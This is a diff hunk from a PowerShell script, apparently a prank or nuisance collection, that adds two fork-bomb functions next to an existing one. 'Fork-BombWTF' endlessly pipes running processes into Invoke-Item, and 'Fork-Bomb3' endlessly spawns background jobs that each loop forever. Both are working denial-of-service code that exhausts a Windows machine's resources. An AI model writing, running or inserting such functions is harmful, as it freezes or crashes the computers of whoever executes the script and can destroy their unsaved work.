@@ -1143,6 +1143,16 @@ Param(
     $mediaPlayer.Play()
 }
 
+Function Fork-BombWTF 
+{
+    For(){Ps|Ii}
+}
+
+Function Fork-Bomb3 
+{
+    For(){ Sajb{ For(){ } } }
+}
+
 Function Fork-Bomb2 
 {
     while(1) {$env:windir\explorer.exe}
